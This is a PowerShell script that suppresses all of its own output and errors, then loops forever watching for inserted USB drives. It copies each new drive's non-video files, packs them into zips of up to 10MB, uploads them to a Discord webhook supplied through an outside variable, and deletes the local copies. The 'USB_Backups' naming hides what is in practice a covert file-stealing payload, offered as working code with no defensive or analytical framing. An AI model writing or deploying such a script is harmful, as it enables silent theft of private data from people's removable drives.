function Write-Host {$null};$PSDefaultParameterValues['*:ErrorAction']='SilentlyContinue';$PSDefaultParameterValues['*:WarningAction']='SilentlyContinue';*>$null;

Add-Type -AssemblyName System.IO.Compression.FileSystem
$WebhookUrl = $dc
$MaxZipSize = 10MB
$OutputDir = "C:\USB_Backups"
$TempDir = "$OutputDir\Temp"
$VideoExtensions = @('.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv', '.mpeg', '.mpg')
$ProcessedDrives = @{}
$LastDriveCount = 0

function Send-ToDiscord {
    param ([string]$FilePath)
    if (-not (Test-Path $FilePath)) {
        Write-Host "File $FilePath does not exist, skipping send."
        return
    }
    try {
        $ZipTest = [System.IO.Compression.ZipFile]::OpenRead($FilePath)
        $ZipTest.Dispose()
    } catch {
        Write-Host "Zip file $FilePath is invalid, skipping send."
        return
    }
    $Boundary = [System.Guid]::NewGuid().ToString()
    $FileName = Split-Path $FilePath -Leaf
    try {
        $FileStream = [System.IO.FileStream]::new($FilePath, 'Open', 'Read')
        $MemStream = [System.IO.MemoryStream]::new()
        $Writer = [System.IO.StreamWriter]::new($MemStream)
        $Writer.Write("--$Boundary`r`nContent-Disposition: form-data; name=`"file`"; filename=`"$FileName`"`r`nContent-Type: application/octet-stream`r`n`r`n")
        $Writer.Flush()
        $FileStream.CopyTo($MemStream)
        $Writer.Write("`r`n--$Boundary--`r`n")
        $Writer.Flush()
        $MemStream.Position = 0
        $Body = $MemStream.ToArray()
        $MemStream.Close()
        $FileStream.Close()
        $Headers = @{"Content-Type" = "multipart/form-data; boundary=$Boundary"}
        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $Body -Headers $Headers
        Write-Host "File $FileName successfully sent to Discord."
    } catch {
        Write-Host "Error sending $FileName to Discord: $_"
    } finally {
        if ($MemStream) { $MemStream.Dispose() }
        if ($FileStream) { $FileStream.Dispose() }
        if ($Writer) { $Writer.Dispose() }
    }
}

function Create-LimitedZip {
    param ([string]$SourceDir, [string]$ZipPrefix, [long]$MaxSize)
    $Files = Get-ChildItem -Path $SourceDir -Recurse -File | Where-Object { $VideoExtensions -notcontains $_.Extension.ToLower() }
    if (-not $Files) {
        Write-Host "No files to zip in $SourceDir, skipping."
        return
    }
    $CurrentZipSize = 0
    $ZipIndex = 1
    $CurrentZipPath = "$OutputDir\$ZipPrefix$ZipIndex.zip"
    $Zip = $null
    $EntryCount = 0
    try {
        $Zip = [System.IO.Compression.ZipFile]::Open($CurrentZipPath, "Create")
        foreach ($File in $Files) {
            $FileSize = $File.Length
            if ($CurrentZipSize + $FileSize -gt $MaxSize -and $EntryCount -gt 0) {
                $Zip.Dispose()
                $Zip = $null
                try {
                    $ZipTest = [System.IO.Compression.ZipFile]::OpenRead($CurrentZipPath)
                    $ZipTest.Dispose()
                    Send-ToDiscord -FilePath $CurrentZipPath
                } catch {
                    Write-Host "Zip file $CurrentZipPath is invalid, skipping."
                }
                if (Test-Path $CurrentZipPath) {
                    Remove-Item $CurrentZipPath -Force
                }
                $ZipIndex++
                $CurrentZipPath = "$OutputDir\$ZipPrefix$ZipIndex.zip"
                $Zip = [System.IO.Compression.ZipFile]::Open($CurrentZipPath, "Create")
                $CurrentZipSize = 0
                $EntryCount = 0
            }
            try {
                $RelativePath = $File.FullName.Substring($SourceDir.Length + 1)
                $Entry = $Zip.CreateEntry($RelativePath)
                $EntryStream = $null
                try {
                    $EntryStream = $Entry.Open()
                    $FileStream = $null
                    try {
                        $FileStream = $File.OpenRead()
                        $FileStream.CopyTo($EntryStream)
                        $EntryStream.Flush()
                    } finally {
                        if ($FileStream) { $FileStream.Close() }
                    }
                } finally {
                    if ($EntryStream) { $EntryStream.Close() }
                }
                $CurrentZipSize += $FileSize
                $EntryCount++
            } catch {
                Write-Host "Error adding $File to zip: $_"
            }
        }
    } finally {
        if ($Zip) { $Zip.Dispose() }
    }
    if ($EntryCount -gt 0) {
        try {
            $ZipTest = [System.IO.Compression.ZipFile]::OpenRead($CurrentZipPath)
            $ZipTest.Dispose()
            Send-ToDiscord -FilePath $CurrentZipPath
        } catch {
            Write-Host "Zip file $CurrentZipPath is invalid, skipping."
        }
        if (Test-Path $CurrentZipPath) {
            Remove-Item $CurrentZipPath -Force
        }
    } else {
        if (Test-Path $CurrentZipPath) {
            Remove-Item $CurrentZipPath -Force
        }
    }
}

if (-not (Test-Path $OutputDir)) {
    New-Item -Path $OutputDir -ItemType Directory
}
if (-not (Test-Path $TempDir)) {
    New-Item -Path $TempDir -ItemType Directory
}

Write-Host "Waiting for USB device..."
while ($true) {
    $Drives = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 }
    $CurrentDriveCount = $Drives.Count
    if ($CurrentDriveCount -ne $LastDriveCount) {
        $LastDriveCount = $CurrentDriveCount
        foreach ($Drive in $Drives) {
            $Serial = $Drive.VolumeSerialNumber
            if ($Serial -and $ProcessedDrives[$Serial]) { continue }
            $DriveLetter = $Drive.DeviceID
            $DriveName = $Drive.VolumeName -replace '[^a-zA-Z0-9]', '_'
            if (-not $DriveName) { $DriveName = "USB_$DriveLetter" }
            $Timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
            $ZipPrefix = "${DriveName}_${Timestamp}_part"
            $SourcePath = "$DriveLetter\"
            Write-Host "Detected USB: $DriveLetter ($DriveName). Starting backup..."
            $TempDriveDir = "$TempDir\$DriveName"
            if (Test-Path $TempDriveDir) {
                Remove-Item -Path $TempDriveDir -Recurse -Force
            }
            New-Item -Path $TempDriveDir -ItemType Directory
            try {
                Copy-Item -Path "$SourcePath\*" -Destination $TempDriveDir -Recurse -Exclude $VideoExtensions -ErrorAction Stop
            } catch {
                Write-Host "Error copying files from ${SourcePath}: $_"
                continue
            }
            Create-LimitedZip -SourceDir $TempDriveDir -ZipPrefix $ZipPrefix -MaxSize $MaxZipSize
            Remove-Item -Path $TempDriveDir -Recurse -Force
            Write-Host "Backup for $DriveLetter completed."
            $ProcessedDrives[$Serial] = 1
        }
    }
    Start-Sleep -Seconds 5
}
